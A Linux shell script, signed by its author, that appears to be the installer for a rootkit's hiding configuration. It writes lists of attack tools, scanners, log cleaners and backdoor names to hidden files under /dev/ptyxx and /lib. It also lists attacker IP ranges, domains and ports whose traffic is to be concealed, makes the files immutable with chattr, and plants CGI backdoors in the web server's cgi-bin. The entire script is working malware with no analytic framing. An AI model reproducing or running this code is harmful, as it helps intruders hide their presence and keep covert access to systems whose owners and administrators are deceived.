#!/bin/sh
# Script by Coinacu
pr="/dev/ptyxx/.proc"
ls="/dev/ptyxx/.list"
ds="/dev/ptyxx/"
sso="/lib/.sso"
hcg="/home/httpd/cgi-bin/"
so="/lib/.so"

if [ -f $so ]; then

chattr -ai $so
rm -rf $so
touch $so
>$so
echo "3 write" >>$so
echo "3 lf" >>$so
echo "3 alpd" >>$so
echo "3 lpd" >>$so
echo "3 xl" >>$so
echo "3 mh" >>$so
echo "3 r00t" >>$so
echo "3 scan" >>$so
echo "3 sc" >>$so
echo "3 sx" >>$so
echo "3 bind8x" >>$so
echo "3 bindme" >>$so
echo "3 bindscan" >>$so
echo "3 try" >>$so
echo "3 cl.sh" >>$so
chmod +x $so
chmod 755 $so
chattr +ai $so

else 
>$so
echo "3 write" >>$so
echo "3 alpd" >>$so
echo "3 lpd" >>$so
echo "3 lf" >>$so
echo "3 xl" >>$so
echo "3 mh" >>$so
echo "3 r00t" >>$so
echo "3 scan" >>$so
echo "3 sc" >>$so
echo "3 sx" >>$so
echo "3 bind8x" >>$so
echo "3 bindme" >>$so
echo "3 bindscan" >>$so
echo "3 try" >>$so
echo "3 cl.sh" >>$so
chmod +x $so
chmod 755 $so
chattr +ai $so
fi

if [ -f $sso ]; then
chattr -ai $sso
rm -rf $sso
touch $sso
>$sso
touch $sso
>$sso
echo "1 194.153.237" >>$sso
echo "1 193.226" >>$sso
echo "1 193.254.34" >>$sso
echo "1 .ro" >>$sso
echo "1 213.233" >>$sso
echo "1 europa.oltenia.ro" >>$sso
echo "1 193.230" >>$sso
echo "3 1982" >>$sso
echo "3 1982" >>$sso
echo "3 1982" >>$sso
echo "4 1981" >>$sso
echo "4 1981" >>$sso
else
touch $sso
>$sso
echo "1 194.153.237" >>$sso
echo "1 193.226" >>$sso
echo "1 .ro" >>$sso
echo "1 213.233" >>$soo
echo "1 193.254.34" >>$sso
echo "1 terrasat.ro" >>$sso
echo "1 europa.oltenia.ro" >>$sso
echo "1 193.230" >>$sso
echo "3 1981" >>$sso
echo "3 1982" >>$sso
echo "3 1982" >>$sso
echo "4 1981" >>$sso
echo "4 1981" >>$sso
echo "4 1982" >>$sso
chmod +x $sso
chmod 755 $sso
chattr +ai $sso
fi 

if [ -d $ds ] && [ -f $pr ];then
chattr -ai $pr
rm -rf $pr
touch $pr
>$pr
echo "3 lf" >>$pr
echo "3 alpd" >>$pr
echo "3 lpd" >>$pr
echo "3 xl" >>$pr
echo "3 mh" >>$pr
echo "3 r00t" >>$pr
echo "3 scan" >>$pr
echo "3 sc" >>$pr
echo "3 sx" >>$pr
echo "3 bind8x" >>$pr
echo "3 bindme" >>$pr
echo "3 bindscan" >>$pr
echo "3 try" >>$pr
echo "3 wu" >>$pr
echo "3 cl.sh" >>$pr
chmod +x $pr
chmod 755 $pr
chattr +ai $pr

else
mkdir -p $ds

touch $pr
>$pr
echo "3 lf" >>$pr
echo "3 xl" >>$pr
echo "3 mh" >>$pr
echo "3 alpd" >>$pr
echo "3 lpd" >>$pr
echo "3 r00t" >>$pr
echo "3 scan" >>$pr
echo "3 sc" >>$pr
echo "3 sx" >>$pr
echo "3 bind8x" >>$pr
echo "3 bindme" >>$pr
echo "3 bindscan" >>$pr
echo "3 try" >>$pr
echo "3 wu" >>$pr
echo "3 cl.sh" >>$pr
chmod +x $pr
chmod 755 $pr
chattr +ai $pr
fi

if [ -f $ls ];then

chattr +ai $ls
rm -rf $ls

touch $ls
>$ls
echo "xl" >>$ls
echo "luckgo" >>$ls
echo "luckstatdx" >>$ls
echo "luckscan-a" >>$ls
echo "games" >>$ls
echo "dica" >>$ls
echo "cl.sh" >>$ls
echo "lpd" >>$ls
echo "alpd" >>$ls
echo "wu" >>$ls
echo "va" >>$ls
echo "xdr" >>$ls
echo "bindme" >>$ls
echo "bind8x" >>$ls
echo "bindscan" >>$ls
echo "drx" >>$ls
echo "logclear" >>$ls
echo "linux.cgi" >>$ls
echo "psid" >>$ls
echo "void.cgi" >>$ls
echo "psg" >>$ls
echo "read" >>$ls
echo "secure" >>$ls
echo "mh" >>$ls
echo "r00t" >>$ls
echo "scan" >>$ls
echo "sc" >>$ls
echo "sx" >>$ls
echo "try" >>$ls
echo ".etc" >>$ls
echo "clean" >>$ls
echo "write" >>$ls
chmod +x $ls
chmod 755 $ls
chattr +ai $ls 
else 
touch $ls
>$ls
echo "xl" >>$ls
echo "luckgo" >>$ls
echo "luckstatdx" >>$ls
echo "luckscan-a" >>$ls
echo "games" >>$ls
echo "alpd" >>$ls
echo "lpd" >>$ls
echo "dica" >>$ls
echo "cl.sh" >>$ls
echo "wu" >>$ls
echo "va" >>$ls
echo "bindme" >>$ls
echo "bind8x" >>$ls
echo "bindscan" >>$ls
echo "drx" >>$ls
echo "logclear" >>$ls
echo "psg" >>$ls
echo "mh" >>$ls
echo "r00t" >>$ls
echo "scan" >>$ls
echo "sc" >>$ls
echo "sx" >>$ls
echo "try" >>$ls
echo "read" >>$ls
echo "secure" >>$ls
echo "write" >>$ls
echo "xdr" >>$ls
echo "drx" >>$ls
echo "linux.cgi" >>$ls
echo ".etc" >>$ls
echo "clean" >>$ls
echo "psid" >>$ls
echo "void.cgi" >>$ls
chmod +x $ls
chmod 755 $ls
chattr +ai $ls

fi

 if [ -d $hcg ]; then
 
mv linux.cgi $hcg/linux.cgi
mv psid $hcg/psid
mv void.cgi $hcg/void.cgi

fi

